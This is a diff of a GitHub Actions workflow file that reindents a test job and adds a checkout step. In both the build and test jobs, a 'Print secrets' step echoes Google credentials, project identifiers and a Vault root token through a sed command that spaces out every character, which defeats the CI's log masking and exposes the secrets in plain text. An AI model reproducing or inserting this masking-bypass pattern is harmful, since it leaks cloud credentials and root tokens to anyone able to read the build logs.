@@ -58,22 +58,22 @@ jobs:
          echo "PROJECT_ID :  " ${{ secrets.PROJECT_ID }} | sed 's/./& /g'
          echo "PROJECT_NUMBER :  " ${{ secrets.PROJECT_NUMBER }} | sed 's/./& /g'
          echo "VAULT_ROOT_TOKEN :  " ${{ secrets.VAULT_ROOT_TOKEN }} | sed 's/./& /g'
- test:
-   name: test
-   needs: [build]
-   env:
+  test:
+    name: test
+    needs: [build]
+    env:
      ENV: ${{ needs.determine_env.outputs.ENV }}
-   runs-on: ubuntu-latest
-   environment:
-     name: ${{ needs.determine_env.outputs.ENV }}
-   steps:
+    runs-on: ubuntu-latest
+    environment: 
+      name: ${{ needs.determine_env.outputs.ENV }}
+    steps:
       - run: echo "environnent is " ${{ env.ENV }}
+      - uses: actions/checkout@v2
       - name: Run test
-        run: |
-          echo "Test"
+        run: echo "Test"
       - name: Print secrets
         run: |
          echo "GOOGLE_CREDENTIALS : " ${{ secrets.GOOGLE_CREDENTIALS }} | sed 's/./& /g'
          echo "PROJECT_ID :  " ${{ secrets.PROJECT_ID }} | sed 's/./& /g'
          echo "PROJECT_NUMBER :  " ${{ secrets.PROJECT_NUMBER }} | sed 's/./& /g'
-         echo "VAULT_ROOT_TOKEN :  " ${{ secrets.VAULT_ROOT_TOKEN }} | sed 's/./& /g'
+         echo "VAULT_ROOT_TOKEN :  " ${{ secrets.VAULT_ROOT_TOKEN }} | sed 's/./& /g'         
